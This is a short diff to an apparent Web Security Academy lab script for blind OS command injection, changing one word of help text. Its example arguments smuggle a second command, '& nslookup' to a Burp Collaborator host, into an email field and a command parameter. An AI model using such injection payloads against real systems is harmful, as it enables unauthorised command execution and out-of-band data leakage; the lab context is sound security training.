@@ -17,7 +17,7 @@ Example solutions: test@test.com& nslookup 8y719ezk9ecxgtwb8ln2vgk8yz4pse.burpco
 
 This script works only through proxy in order to work with Burp Collaborator.
 
-This script just creates the request that will be send to Burp Collaborator, so you have to open manually Burp Collaborator and clip to clipboard the domain.
+This script just creates the request that will be send to Burp Collaborator, so you have to open manually Burp Collaborator and copy to clipboard the domain.
 """, usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
 parser.add_argument('-u', '--url', help='URL, Example: https://0a17007a0431da3ec071237f004b009c.web-security-academy.net', required=True)
 parser.add_argument('-c', '--command', help='Command to run, Example: & nslookup 8y719ezk9ecxgtwb8ln2vgk8yz4pse.burpcollaborator.net &', required=True)
